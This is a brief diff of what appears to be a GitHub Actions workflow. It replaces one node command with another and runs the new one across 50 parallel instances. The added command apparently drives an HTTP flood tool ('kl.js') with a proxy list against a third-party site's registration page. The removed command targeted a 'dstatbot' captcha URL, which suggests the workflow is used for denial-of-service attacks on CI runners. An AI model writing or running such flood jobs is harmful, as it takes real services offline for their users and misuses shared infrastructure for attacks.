@@ -46,7 +46,7 @@ jobs:
           unzip Fc-main.zip
           cd Fc-main
          
-          xvfb-run -a node m.js https://captcha.dstatbot.win/IS5N07Qz 200 3 3
+          node kl.js GET https://generation-trader.tech/register 200 4 120 proxy.txt --full
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 50
